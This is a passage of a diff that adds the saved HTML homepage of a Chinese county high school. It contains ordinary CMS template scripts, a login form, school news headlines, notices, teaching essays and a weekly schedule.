@@ -1,0 +1,1243 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<!-- saved from url=(0023)http://www.njschool.cn/ -->
+<HTML xmlns="http://www.w3.org/1999/xhtml">
+
+
+<HEAD><TITLE>山东省沾化县第一中学</TITLE>
+<META content="text/html; charset=gb2312" http-equiv=Content-Type>
+<META name=Keywords content="">
+<META name=Description content=""><LINK rel=stylesheet type=text/css 
+href="/templets/default/style/default.css">
+
+
+<SCRIPT language=javascript type=text/javascript src="/templets/default/style/common.js"></SCRIPT>
+
+
+
+
+
+
+<SCRIPT type=text/javascript>
+
+function scrollDoor(){
+}
+scrollDoor.prototype = {
+sd : function(menus,divs,openClass,closeClass){
+   var _this = this;
+   if(menus.length != divs.length)
+   {
+    alert("菜单层数量和内容层数量不一样!");
+    return false;
+   }    
+   for(var i = 0 ; i < menus.length ; i++)
+   { 
+    _this.$(menus[i]).value = i;    
+    _this.$(menus[i]).onmouseover = function(){
+     
+     for(var j = 0 ; j < menus.length ; j++)
+     {      
+      _this.$(menus[j]).className = closeClass;
+      _this.$(divs[j]).style.display = "none";
+     }
+     _this.$(menus[this.value]).className = openClass; 
+     _this.$(divs[this.value]).style.display = "block";    
+    }
+   }
+   },
+$ : function(oid){
+   if(typeof(oid) == "string")
+   return document.getElementById(oid);
+   return oid;
+}
+}
+window.onload = function(){
+var SDmodel = new scrollDoor();
+SDmodel.sd(["a01","a02","a03"],["aa01","aa02","aa03"],"sd01","sd02");
+SDmodel.sd(["b01","b02"],["bb01","bb02"],"sd01","sd02");
+SDmodel.sd(["c01","c02","c03","c04"],["cc01","cc02","cc03","cc04"],"sd01","sd02");
+SDmodel.sd(["d01","d02","d03","d04"],["dd01","dd02","dd03","dd04"],"sd01","sd02");
+SDmodel.sd(["e01","e02","e03","e04"],["ee01","ee02","ee03","ee04"],"sd01","sd02");
+SDmodel.sd(["f01","f02","f03","f04"],["ff01","ff02","ff03","ff04"],"sd01","sd02");
+}
+</SCRIPT>
+
+<SCRIPT type=text/javascript>
+//d1 = 外围容器,d2 =内容,d3 = 复制d2的内容接替循环滚;
+//e = 方向与方法
+//1,2,3,4 = 自动滚动，分别对应：上,右,下,左
+//"top","right","bottom","left" = 手动滚动，分别对应：上,右,下,左
+//Cspeed=速度
+function chenkemove(d1,d2,d3,e,Cspeed){ 
+var speed = Cspeed;
+    var demo=document.getElementById(d1); 
+    var demo1=document.getElementById(d2); 
+    var demo2=document.getElementById(d3); 
+    demo2.innerHTML=demo1.innerHTML; 
+    function boxTop(){ 
+            if(demo2.offsetTop-demo.scrollTop<=0){demo.scrollTop-=demo1.offsetHeight} 
+            else{demo.scrollTop++} 
+        } 
+    function boxRight(){ 
+            if(demo.scrollLeft<=0){demo.scrollLeft+=demo2.offsetWidth} 
+            else{demo.scrollLeft--} 
+        } 
+    function boxBottom(){ 
+            if(demo1.offsetTop-demo.scrollTop>=0){demo.scrollTop+=demo2.offsetHeight} 
+            else{demo.scrollTop--} 
+        } 
+    function boxLeft(){ 
+            if(demo2.offsetWidth-demo.scrollLeft<=0){demo.scrollLeft-=demo1.offsetWidth} 
+            else{demo.scrollLeft++} 
+        } 
+    if(e==1){ 
+            var MoveTop=setInterval(boxTop,speed); 
+            demo.onmouseover=function(){clearInterval(MoveTop);} 
+            demo.onmouseout=function(){MoveTop=setInterval(boxTop,speed)} 
+        } 
+    if(e==2){ 
+            var MoveRight=setInterval(boxRight,speed); 
+            demo.onmouseover=function(){clearInterval(MoveRight)} 
+            demo.onmouseout=function(){MoveRight=setInterval(boxRight,speed)} 
+        } 
+    if(e==3){ 
+            var MoveBottom=setInterval(boxBottom,speed); 
+            demo.onmouseover=function(){clearInterval(MoveBottom);} 
+            demo.onmouseout=function(){MoveBottom=setInterval(boxBottom,speed)} 
+        } 
+    if(e==4){ 
+            var MoveLeft=setInterval(boxLeft,speed) 
+            demo.onmouseover=function(){clearInterval(MoveLeft)} 
+            demo.onmouseout=function(){MoveLeft=setInterval(boxLeft,speed)} 
+        } 
+    if(e=="top"){ 
+            MoveTop=setInterval(boxTop,speed) 
+            demo.onmouseout=function(){clearInterval(MoveTop);} 
+        } 
+    if(e=="right"){ 
+            MoveRight=setInterval(boxRight,speed) 
+            demo.onmouseout=function(){clearInterval(MoveRight);} 
+        } 
+    if(e=="bottom"){ 
+            MoveBottom=setInterval(boxBottom,speed) 
+            demo.onmouseout=function(){clearInterval(MoveBottom);} 
+        } 
+    if(e=="left"){ 
+            MoveLeft=setInterval(boxLeft,speed) 
+            demo.onmouseout=function(){clearInterval(MoveLeft);} 
+        } 
+    }   
+</SCRIPT>
+
+<STYLE type=text/css>.leftLoop {
+	POSITION: relative; OVERFLOW: hidden
+}
+.leftLoop .hdd {
+	BACKGROUND: #f4f4f4; HEIGHT: 30px; OVERFLOW: hidden
+}
+.leftLoop .hdd .prev {
+	LINE-HEIGHT: 10px; MARGIN-TOP: 10px; WIDTH: 5px; DISPLAY: block; BACKGROUND: url(images/icoLeft.gif) no-repeat; FLOAT: right; HEIGHT: 9px; OVERFLOW: hidden; CURSOR: pointer; MARGIN-RIGHT: 10px
+}
+.leftLoop .hd .next {
+	LINE-HEIGHT: 10px; MARGIN-TOP: 10px; WIDTH: 5px; DISPLAY: block; BACKGROUND: url(images/icoLeft.gif) no-repeat; FLOAT: right; HEIGHT: 9px; OVERFLOW: hidden; CURSOR: pointer; MARGIN-RIGHT: 10px
+}
+.leftLoop .hdd .next {
+	BACKGROUND: url(images/icoRight.gif) no-repeat
+}
+.leftLoop .hdd UL {
+	MARGIN-TOP: 10px; ZOOM: 1; FLOAT: left; OVERFLOW: hidden
+}
+.leftLoop .hdd UL LI {
+	POSITION: relative; TEXT-INDENT: -999px; WIDTH: 10px; BACKGROUND: #ccc; HEIGHT: 10px; OVERFLOW: hidden; CURSOR: pointer; MARGIN-RIGHT: 10px; BEHAVIOR: url(../PIE.htc); _display: inline; -webkit-border-radius: 10px; -moz-border-radius: 10px; border-radius: 10px
+}
+.leftLoop .hd UL LI.on {
+	BACKGROUND: #f00
+}
+</STYLE>
+
+<script language="javascript" type="text/javascript" src="/include/dedeajax2.js"></script>
+<script type="text/javascript" language="javascript">
+<!--
+$(function(){
+  $("a[_for]").mouseover(function(){
+   $(this).parents().children("a[_for]").removeClass("thisclass").parents().children("dd").hide();
+   $(this).addClass("thisclass").blur();
+   $("#"+$(this).attr("_for")).show();
+  });
+  $("a[_for=uc_member]").mouseover();
+  $("a[_for=flink_1]").mouseover();
+});
+function CheckLogin(){
+   var taget_obj = document.getElementById('_userlogin');
+   myajax = new DedeAjax(taget_obj,false,false,'','','');
+   myajax.SendGet2("/member/ajax_loginsta.php");
+   DedeXHTTP = null;
+}
+-->
+</script>
+
+
+
+<DIV class=top>
+<DIV class=fl>
+</div>
+
+<TD width=850 align=right>
+ <div id="_userlogin">
+<form name="userlogin" action="/member/index_do.php" method="POST">
+<input type="hidden" name="fmdo" value="login" />
+<input type="hidden" name="dopost" value="login" />
+<input type="hidden" name="keeptime" value="604800" />
+<input type="hidden" name="gourl" value="" />
+
+<div class="fb">用户名:<input type="text" name="userid" style="width:60px;height:18px;border:1px solid #000" class="ipt-txt" />
+密码:<input type="password" name="pwd" style="width:60px;height:18px;border:1px solid #000" class="ipt-txt" />
+
+验证码:
+<input type="text" name="vdcode" style="width:40px;height:18px;border:1px solid #000" />
+<img id="vdimgck" align="absmiddle" onClick="this.src=this.src+'?'" style="cursor:pointer;margin-left:0px;text-transform:uppercase;" alt="看不清？点击更换" src="/include/vdimgck.php"width="42" height="18" align="absmiddle" />
+
+<button id="btnSignCheck" class="button2" type="submit">登&nbsp;录</button>
+<a href="/member/index_do.php?fmdo=user&dopost=regnew">注册</a>
+<a href="/member/resetpassword.php">忘记密码?</a><a href="/member/index_do.php?fmdo=user&dopost=regnew"></a>
+
+</form>
+</div>
+</div>
+<script language="javascript" type="text/javascript">CheckLogin();</script> 
+
+</TD>
+
+
+
+<DIV class=clear></div>
+</div>
+
+
+
+
+
+
+<DIV class=wbox>
+<DIV class=header>
+
+<DIV class=flash>
+
+<td valign="top" height="156" border="0" width="1005">
+	<div class="pngholder">
+          <object >
+            <param name="movie" />
+            <param name="quality" value="high" />
+            <param name="wmode" value="transparent" />
+            <param name="menu" value="false" />
+            <embed src="/img/3.swf" quality="high" pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" 
+		width="1005" height="156" wmode="transparent" menu="false"> </embed>
+          </object>         
+        </div>
+</td>
+
+</div>
+
+
+<DIV class="navBox ">
+
+
+
+<table width="960" height="35" border="0" align="center" cellpadding="0" cellspacing="0" background="/templets/images/index_navbg.gif">
+  <tr>
+    <td  width="60"><div align="center"><a href="/" class="a01">首 页</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/plus/list.php?tid=1' class="a01">校园风采</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/plus/list.php?tid=2' class="a01">教务教研</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/plus/list.php?tid=3' class="a01">党团建设</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/plus/list.php?tid=4' class="a01">德育之窗</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/plus/list.php?tid=5' class="a01">教师风采</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/plus/list.php?tid=6' class="a01">学生乐园</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/plus/list.php?tid=7' class="a01">校务公开</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/plus/list.php?tid=8' class="a01">校园媒体</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/plus/list.php?tid=49' class="a01">健康教育</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+    
+    <td width="60"><div align="center"> <a href='/a/jiaoyuziyuan/' class="a01">教育资源</a></div></td>
+    <td width="15" align="center"  ><img src="/templets/images/line.jpg" width="1" /></td>
+      <td  align="center"  ></td></tr>
+</table>
+<tr>
+   
+<SCRIPT language=javascript>
+function trains(id,text){document.all[id].innerHTML=' '+text}
+function trainpic(id,text){document.all[id].innerHTML='<img src="'+text+'.gif">'}
+function high(which2){
+theobject=which2;theobject.filters.alpha.opacity=0
+highlighting=setInterval("highlightit(theobject)",50)}
+function low(which2){
+clearInterval(highlighting)
+which2.filters.alpha.opacity=100}
+function highlightit(cur2){
+if (cur2.filters.alpha.opacity<100)
+cur2.filters.alpha.opacity+=25
+else if(window.highting)
+clearInterval(highlighting)}
+                      </SCRIPT>
+
+ 
+
+
+
+
+
+  
+  
+<DIV id=subnav class=subnav>
+
+<DIV id=menu_list_-2 class=menu_list>
+<DIV class=fl>
+<UL>
+  <LI class=day>今天是：
+  <SCRIPT language=JavaScript>
+					<!--
+					var day="";
+					var month="";
+					var ampm="";
+					var ampmhour="";
+					var myweekday="";
+					var year="";
+					mydate=new Date();
+					myweekday=mydate.getDay();
+					mymonth=mydate.getMonth()+1;
+					myday= mydate.getDate();
+					myyear= mydate.getYear();
+					year=(myyear > 200) ? myyear : 1900 + myyear;
+					if(myweekday == 0)
+					weekday=" 星期日";
+					else if(myweekday == 1)
+					weekday=" 星期一";
+					else if(myweekday == 2)
+					weekday=" 星期二";
+					else if(myweekday == 3)
+					weekday=" 星期三";
+					else if(myweekday == 4)
+					weekday=" 星期四";
+					else if(myweekday == 5)
+					weekday=" 星期五";
+					else if(myweekday == 6)
+					weekday=" 星期六";
+					document.write(year+"年"+mymonth+"月"+myday+"日"+weekday);
+			 -->
+			 </SCRIPT>
+   </LI>
+ <li class="whe"><iframe src="http://m.weather.com.cn/m/pn3/weather.htm " width="360" height="80" marginwidth="0" marginheight="0" hspace="0" vspace="0" frameborder="0" allowtransparency="true" scrolling="no"></iframe></li>
+</UL></div>
+
+<div class="fr"><div class="fsearch">	   
+	  <input id="keyword_tongzhou" class="ck4"  value='' size="30" maxlength="100"  />
+	  <input type="image" id="Submit_tongzhou" class="ck5" src="/templets/default/images/srch.jpg" 
+		onclick="OnSearchCheckAndSubmit();" />	  
+	<script type="text/javascript" language="javascript">
+          function OnSearchCheckAndSubmit(){
+            var keyword = document.getElementById("keyword_tongzhou").value;
+       
+            window.location = "/search.aspx?searchtype=0&ModelId=1" + "&Keyword=" + keyword;
+        }
+   
+    </script>
+</div></div>
+
+</div></div></div>
+
+</div>
+
+<link href="style/default.css" rel="stylesheet" type="text/css">
+<META name=GENERATOR content="MSHTML 8.00.6001.18702"></HEAD>
+<BODY>
+
+<DIV class="part  news">
+<DIV class=fl>
+<DIV class=tbox>
+<DIV class=fll>
+   <script language='javascript'>
+linkarr = new Array();
+picarr = new Array();
+textarr = new Array();
+var swf_width=328;
+var swf_height=266;
+//文字颜色|文字位置|文字背景颜色|文字背景透明度|按键文字颜色|按键默认颜色|按键当前颜色|自动播放时间|图片过渡效果|是否显示按钮|打开方式
+var configtg='0xffffff|0|0x3FA61F|5|0xffffff|0xC5DDBC|0x000033|2|3|1|_blank';
+var files = "";
+var links = "";
+var texts = "";
+//这里设置调用标记
+linkarr[1] = "/plus/view.php?aid=160";
+picarr[1]  = "/uploads/allimg/150424/7-15042411212D17-lp.JPG";
+textarr[1] = "教学楼";
+linkarr[2] = "/plus/view.php?aid=177";
+picarr[2]  = "/uploads/allimg/150512/2-150512164253452-lp.jpg";
+textarr[2] = "我校学生在全市机器人比赛中获市";
+linkarr[3] = "/plus/view.php?aid=162";
+picarr[3]  = "/uploads/allimg/150424/2-15042416314K56-lp.jpg";
+textarr[3] = "机器人比赛如火如荼，沾化一中载";
+linkarr[4] = "/plus/view.php?aid=163";
+picarr[4]  = "/uploads/allimg/150424/2-1504241A553209-lp.JPG";
+textarr[4] = "高二1级部全体师生参加升旗仪式";
+linkarr[5] = "/plus/view.php?aid=122";
+picarr[5]  = "/uploads/150331/5-1503310K414516-lp.jpg";
+textarr[5] = "沾化一中首届“励志青春”班主任";
+
+for(i=1;i<picarr.length;i++){
+if(files=="") files = picarr[i];
+else files += "|"+picarr[i];
+}
+for(i=1;i<linkarr.length;i++){
+if(links=="") links = linkarr[i];
+else links += "|"+linkarr[i];
+}
+for(i=1;i<textarr.length;i++){
+if(texts=="") texts = textarr[i];
+else texts += "|"+textarr[i];
+}
+document.write('<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0" width="'+ swf_width +'" height="'+ swf_height +'">');
+document.write('<param name="movie" value="/templets/default/images/bcastr3.swf"><param name="quality" value="high">');
+document.write('<param name="menu" value="false"><param name=wmode value="opaque">');
+document.write('<param name="FlashVars" value="bcastr_file='+files+'&bcastr_link='+links+'&bcastr_title='+texts+'&bcastr_config='+configtg+'">');
+document.write('<embed src="/templets/default/images/bcastr3.swf" wmode="opaque" FlashVars="bcastr_file='+files+'&bcastr_link='+links+'&bcastr_title='+texts+'&bcastr_config='+configtg+'&menu="false" quality="high" width="'+ swf_width +'" height="'+ swf_height +'" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />'); document.write('</object>');
+</script>
+</div>
+<DIV class=frr>
+<DIV class=hd>
+<UL class=newsHd>
+  
+  <LI id=a01><A href="/plus/list.php?tid=37">【校园新闻】</A>   </LI>
+  <LI id=a02><A   href="/plus/list.php?tid=39">【周行事历】</A></LI>
+  <LI id=a03 class=sd01><A >【最新文章】</A> </LI>
+</UL></div>
+<DIV class=bd>
+<SCRIPT type=text/javascript src="/templets/default/style/jquery.pack.js"></SCRIPT>
+
+<SCRIPT type=text/javascript src="/templets/default/style/jQuery.blockUI.js"></SCRIPT>
+
+<SCRIPT type=text/javascript 
+src="/templets/default/style/jquery.SuperSlide.js"></SCRIPT>
+
+<DIV id=aa01 class=effect>
+<DIV style="WIDTH: 330px" class=leftLoop>
+<DIV style="DISPLAY: none" class=hd><A class=next></A>
+<UL class=num>
+  <LI>1</LI>
+  <LI>2</LI>
+  <LI>3</LI></UL><A class=prev></A></div>
+<DIV class=bd>
+	<!--下面是幻灯片右侧最新文章的调用(共三个栏目)开始-->
+
+<UL class="samelist infoList">
+	<LI><SPAN>12-26</SPAN><A 
+  title="标题：沾化一中2015级学生成人礼温情举行&#13;点击数：503 ;发表时间：17-12-26" 
+  href="/plus/view.php?aid=246" 
+  target=_blank>沾化一中2015级学生成人礼温情举行</A></LI>
+<LI><SPAN>10-30</SPAN><A 
+  title="标题：沾化一中2017年秋季田径运动会隆重召开&#13;点击数：509 ;发表时间：17-10-30" 
+  href="/plus/view.php?aid=247" 
+  target=_blank>沾化一中2017年秋季田径运动会隆重召开</A></LI>
+<LI><SPAN>10-30</SPAN><A 
+  title="标题：“十八而志，尽责成才”沾化一中2014级学生&#13;点击数：804 ;发表时间：17-10-30" 
+  href="/plus/view.php?aid=237" 
+  target=_blank>“十八而志，尽责成才”沾化一中2014级学生</A></LI>
+<LI><SPAN>09-30</SPAN><A 
+  title="标题：沾化一中2016级青春励志·歌唱祖国——“欢&#13;点击数：627 ;发表时间：17-09-30" 
+  href="/plus/view.php?aid=245" 
+  target=_blank>沾化一中2016级青春励志·歌唱祖国——“欢</A></LI>
+<LI><SPAN>09-30</SPAN><A 
+  title="标题：心怀祖国·立志成才——沾化一中“欢度国庆&#13;点击数：446 ;发表时间：17-09-30" 
+  href="/plus/view.php?aid=244" 
+  target=_blank>心怀祖国·立志成才——沾化一中“欢度国庆</A></LI>
+<LI><SPAN>09-08</SPAN><A 
+  title="标题：教师节来临之际区领导前来我校走访慰问一线&#13;点击数：287 ;发表时间：17-09-08" 
+  href="/plus/view.php?aid=243" 
+  target=_blank>教师节来临之际区领导前来我校走访慰问一线</A></LI>
+<LI><SPAN>09-07</SPAN><A 
+  title="标题：沾化一中2017级开学典礼暨军训动员大会召开&#13;点击数：606 ;发表时间：17-09-07" 
+  href="/plus/view.php?aid=241" 
+  target=_blank>沾化一中2017级开学典礼暨军训动员大会召开</A></LI>
+<LI><SPAN>09-07</SPAN><A 
+  title="标题：沾化一中2017级军训汇操比赛暨总结表彰大会&#13;点击数：629 ;发表时间：17-09-07" 
+  href="/plus/view.php?aid=242" 
+  target=_blank>沾化一中2017级军训汇操比赛暨总结表彰大会</A></LI>
+<LI><SPAN>02-26</SPAN><A 
+  title="标题：沾化一中举办首届“青少年卓越领袖特训营”&#13;点击数：764 ;发表时间：17-02-26" 
+  href="/plus/view.php?aid=225" 
+  target=_blank>沾化一中举办首届“青少年卓越领袖特训营”</A></LI>
+<LI><SPAN>11-11</SPAN><A 
+  title="标题：沾化一中建校六十周年庆祝大会圆满召开&#13;点击数：2062 ;发表时间：16-11-11" 
+  href="/plus/view.php?aid=235" 
+  target=_blank>沾化一中建校六十周年庆祝大会圆满召开</A></LI>
+<LI><SPAN>11-10</SPAN><A 
+  title="标题：沾化一中庆祝建校60周年表彰大会&#13;点击数：1298 ;发表时间：16-11-10" 
+  href="/plus/view.php?aid=236" 
+  target=_blank>沾化一中庆祝建校60周年表彰大会</A></LI>
+<LI><SPAN>10-26</SPAN><A 
+  title="标题：沾化区为民服务宣传手册&#13;点击数：291 ;发表时间：16-10-26" 
+  href="/plus/view.php?aid=229" 
+  target=_blank>沾化区为民服务宣传手册</A></LI>
+
+  
+</UL></div></div>
+<SCRIPT type=text/javascript>
+	jQuery(".leftLoop").slide( { mainCell:".bd ul",effect:"topLoop",autoPlay:true,vis:12,scroll:12,delayTime:1,interTime:10000,trigger:"click"} );
+					</SCRIPT>
+</div>
+
+<UL id=aa02 class="samelist hidden">
+
+	
+
+</UL>
+<UL id=aa03 class="samelist hidden">
+
+	<LI><SPAN>12-26</SPAN><A 
+  title="标题：沾化一中2015级学生成人礼温情举行&#13;点击数：503 ;发表时间：17-12-26" 
+  href="/plus/view.php?aid=246" 
+  target=_blank>沾化一中2015级学生成人礼温情举行</A></LI>
+<LI><SPAN>10-30</SPAN><A 
+  title="标题：沾化一中2017年秋季田径运动会隆重召开&#13;点击数：509 ;发表时间：17-10-30" 
+  href="/plus/view.php?aid=247" 
+  target=_blank>沾化一中2017年秋季田径运动会隆重召开</A></LI>
+<LI><SPAN>10-30</SPAN><A 
+  title="标题：“十八而志，尽责成才”沾化一中2014级学生&#13;点击数：804 ;发表时间：17-10-30" 
+  href="/plus/view.php?aid=237" 
+  target=_blank>“十八而志，尽责成才”沾化一中2014级学生</A></LI>
+<LI><SPAN>09-30</SPAN><A 
+  title="标题：沾化一中2016级青春励志·歌唱祖国——“欢&#13;点击数：627 ;发表时间：17-09-30" 
+  href="/plus/view.php?aid=245" 
+  target=_blank>沾化一中2016级青春励志·歌唱祖国——“欢</A></LI>
+<LI><SPAN>09-30</SPAN><A 
+  title="标题：心怀祖国·立志成才——沾化一中“欢度国庆&#13;点击数：446 ;发表时间：17-09-30" 
+  href="/plus/view.php?aid=244" 
+  target=_blank>心怀祖国·立志成才——沾化一中“欢度国庆</A></LI>
+<LI><SPAN>09-08</SPAN><A 
+  title="标题：教师节来临之际区领导前来我校走访慰问一线&#13;点击数：287 ;发表时间：17-09-08" 
+  href="/plus/view.php?aid=243" 
+  target=_blank>教师节来临之际区领导前来我校走访慰问一线</A></LI>
+<LI><SPAN>09-07</SPAN><A 
+  title="标题：沾化一中2017级开学典礼暨军训动员大会召开&#13;点击数：606 ;发表时间：17-09-07" 
+  href="/plus/view.php?aid=241" 
+  target=_blank>沾化一中2017级开学典礼暨军训动员大会召开</A></LI>
+<LI><SPAN>09-07</SPAN><A 
+  title="标题：沾化一中2017级军训汇操比赛暨总结表彰大会&#13;点击数：629 ;发表时间：17-09-07" 
+  href="/plus/view.php?aid=242" 
+  target=_blank>沾化一中2017级军训汇操比赛暨总结表彰大会</A></LI>
+<LI><SPAN>06-20</SPAN><A 
+  title="标题：ceshi&#13;点击数：152 ;发表时间：17-06-20" 
+  href="/plus/view.php?aid=240" 
+  target=_blank>ceshi</A></LI>
+<LI><SPAN>05-10</SPAN><A 
+  title="标题：表现性评价（2017青岛）&#13;点击数：167 ;发表时间：17-05-10" 
+  href="/plus/view.php?aid=239" 
+  target=_blank>表现性评价（2017青岛）</A></LI>
+<LI><SPAN>02-26</SPAN><A 
+  title="标题：沾化一中举办首届“青少年卓越领袖特训营”&#13;点击数：764 ;发表时间：17-02-26" 
+  href="/plus/view.php?aid=225" 
+  target=_blank>沾化一中举办首届“青少年卓越领袖特训营”</A></LI>
+<LI><SPAN>11-11</SPAN><A 
+  title="标题：沾化一中建校六十周年庆祝大会圆满召开&#13;点击数：2062 ;发表时间：16-11-11" 
+  href="/plus/view.php?aid=235" 
+  target=_blank>沾化一中建校六十周年庆祝大会圆满召开</A></LI>
+
+</UL></div></div>
+	<!--上面是幻灯片右侧最新文章的调用(共三个栏目)结束-->
+	
+<DIV class=clear></div></div></div>
+<DIV class="fr border">
+<DIV class="tbox ann">
+<DIV class=hd>
+<UL class=annHd>
+  <LI id=b01 class=sd01><A 
+  href="/plus/list.php?tid=36">通知公告</A> </LI>
+  <LI id=b02><A href="/plus/list.php?tid=31">教育随笔</A> 
+  </LI></UL></div>
+<DIV class=bd>
+<UL id=bb01 class="samelist2 ">
+	
+  <LI><SPAN></SPAN><a href='/plus/view.php?aid=168'>校园网络直播</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=158'>关于开展全区中小学“网上晒课、赛</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=233'>OA软件下载</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=231'>倾听沾化群众的声音，7312345用心</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=125'>滨州市教学研究关于开展高三专题教</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=142'>关于夏季高考考试科目使用全国卷有</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=232'>7312345，为民服务找政府</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=234'>校园OA绑定常用邮箱方法</a>  <br/></LI>
+
+    
+</UL>
+<UL id=bb02 class="samelist2 hidden">
+	
+   <LI><SPAN></SPAN><a href='/plus/view.php?aid=127'>创设问题情境,课堂教学的金钥匙</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=128'>素质教育下的微积分教学初探</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=143'>从“双钩填墨”开始——高中美术书</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=131'>浅谈高中化学教学的优化</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=121'>学习衡水经验，付诸教育实践</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=116'>考前寄语</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=126'>做更好的自己</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=133'>高中化学教学中错别字现象及矫正对</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=132'>高中化学探究式教学模式的初探与实</a>  <br/></LI>
+<LI><SPAN></SPAN><a href='/plus/view.php?aid=114'>一些感慨</a>  <br/></LI>
+
+ 
+
+</UL></div></div></div>
+<DIV class=clear></div></div>
+<DIV class="adBanner mtop10">
+</div>
+<DIV class=part2>
+<DIV class="fl border mtop10">
+<DIV class=tbox>
+<DIV class=eve>
+<DIV class=hd>
+<H4><A href="/plus/list.php?tid=15">每周工作计划</A></H4></div>
+
+<DIV class=bd>  
+
+<table border="1" cellpadding="0" cellspacing="1" style="width:100.0%;" width="100%">
+	<tbody>
+		<tr>
+			<td>
+				月</td>
+			<td>
+				日</td>
+			<td>
+				星期</td>
+			<td>
+				计划与安排</td>
+			<td>
+				部门</td>
+		</tr>
+		<tr>
+			<td rowspan="7">
+				&nbsp;</td>
+			<td>
+				&nbsp;</td>
+			<td>
+				一</td>
+			<td>
+				升旗仪式<br />
+				国际部校园开放日</td>
+			<td>
+				&nbsp;</td>
+		</tr>
+		<tr>
+			<td>
+				&nbsp;</td>
+			<td>
+				二</td>
+			<td>
+				青年教师说课比赛</td>
+			<td>
+				&nbsp;</td>
+		</tr>
+		<tr>
+			<td>
+				&nbsp;</td>
+			<td>
+				三</td>
+			<td>
+				高三停课复习<br />
+				行政会议</td>
+			<td>
+				&nbsp;</td>
+		</tr>
+		<tr>
+			<td>
+				&nbsp;</td>
+			<td>
+				四</td>
+			<td>
+				教职工大会</td>
+			<td>
+				&nbsp;</td>
+		</tr>
+		<tr>
+			<td>
+				&nbsp;</td>
+			<td>
+				五</td>
+			<td>
+				&nbsp;</td>
+			<td>
+				&nbsp;</td>
+		</tr>
+		<tr>
+			<td>
+				&nbsp;</td>
+			<td>
+				六</td>
+			<td>
+				高一、高二阶段检测</td>
+			<td>
+				&nbsp;</td>
+		</tr>
+		<tr>
+			<td>
+				&nbsp;</td>
+			<td>
+				日</td>
+			<td>
+				高一、高二阶段检测</td>
+			<td>
+				&nbsp;</td>
+		</tr>
+	</tbody>
+</table>
+
+
+
+</div>
+</div>
+
+
+
+<DIV class="dis mtop10">
+<DIV class=hd>
+<H4>数字化教学</H4></div>
+<DIV class=bd>
+<UL>
+  <LI class=di01><SPAN><A href="http://www.bzzhyz.com" target=_blank 
+  }?>教师共享</A></SPAN></LI>
+  <LI class=di02><SPAN><A href="hhttp://www.bzzhyz.com" 
+  target=_blank>课件资源</A></SPAN></LI>
+  <LI class=di03><SPAN><A href="http://www.bzzhyz.com" 
+  target=_blank>图书查询</A></SPAN></LI>
+  <LI class=di04><SPAN><A 
+  href="http://www.bzzhyz.com">电子图书</A></SPAN></LI>
+  <LI class=di05><SPAN><A 
+  href="http://www.bzzhyz.com">设备报修</A></SPAN></LI>
+  <LI class=di06><SPAN><A href="http://www.bzzhyz.com" 
+  target=_blank>微格教室</A></SPAN></LI>
+  <LI class=di07><SPAN><A 
+  href="http://www.bzzhyz.com">软件安装</A></SPAN></LI>
+  <LI class=di08><SPAN><A href="http://www.bzzhyz.com" 
+  target=_blank>网络电视</A></SPAN></LI>
+  <LI class=di09><SPAN><A 
+  href="http://www.bzzhyz.com">场馆预约</A></SPAN></LI>
+  <LI class=di10><SPAN><A 
+  href="http://www.bzzhyz.com">成绩查询</A></SPAN></LI>
+  <LI class=di11><SPAN><A 
+  href="http://www.bzzhyz.com">校本资源</A></SPAN></LI>
+  <LI class=di12><SPAN><A 
+  href="http://www.bzzhyz.com">学校图片</A></SPAN></LI>
+  <LI class=di13><SPAN><A 
+  href="http://www.626china.org">禁毒展馆</A></SPAN></LI>
+  <LI class=di14><SPAN><A 
+  href="http://www.bzzhyz.com">预留位置</A></SPAN></LI></UL></div></div>
+<DIV class="kri mtop10">
+<DIV class=hd>
+<H4>快速导航</H4></div>
